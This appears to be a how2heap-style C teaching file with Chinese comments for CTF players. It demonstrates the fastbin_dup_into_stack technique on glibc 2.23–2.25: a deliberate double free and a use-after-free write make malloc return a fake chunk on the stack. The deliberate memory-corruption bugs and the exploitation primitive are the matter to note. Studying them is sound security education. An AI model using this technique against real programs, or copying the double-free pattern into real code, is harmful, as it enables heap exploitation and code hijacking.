/*
 * 中文导读（CTF 版）
 *
 * 手法：fastbin_dup_into_stack
 * 文件标注范围：2.23 ~ 2.25
 * 模拟漏洞：double free 加 UAF，可改写已经重新取回的 fastbin chunk 的 fd。
 * 核心流程：先得到 A→B→A，再把 A->fd 改成伪造 chunk 头；2.32 起写入的是 (存储位置>>12)^目标地址。
 * 成功判据：最后一次 malloc/calloc 返回栈上预期地址；目标的对齐与伪造 size 必须通过当前版本检查。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{

	unsigned long long stack_var;

	int *a = malloc(8);
	int *b = malloc(8);
	malloc(8); // 保护块防止 b 与 top 合并。

	free(a);

	// free(a);

	free(b);

	free(a);

	unsigned long long *d = malloc(8);

	// 第一次取出 a 后，链表表头变为 b；再分配一次取出 b，使重复节点 a 回到表头。
	void *second = malloc(8);
	assert(second == b);

	stack_var = 0x20;

	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	// 这次分配再次取出 a，同时让伪造的栈上 chunk 成为 fastbin 表头。
	void *third = malloc(8);
	assert(third == a);
	void *stack_result = malloc(8);

	/* 旧 how2heap 文件只打印地址，即使堆管理器没返回目标也会 exit 0。
	 * 这里直接验证 fastbin fake chunk 的 user 区就是 &stack_var+8。
	 */
	assert(stack_result == 8 + (char *)&stack_var);
	fprintf(stderr, "[+] fastbin：返回栈地址\n");
}
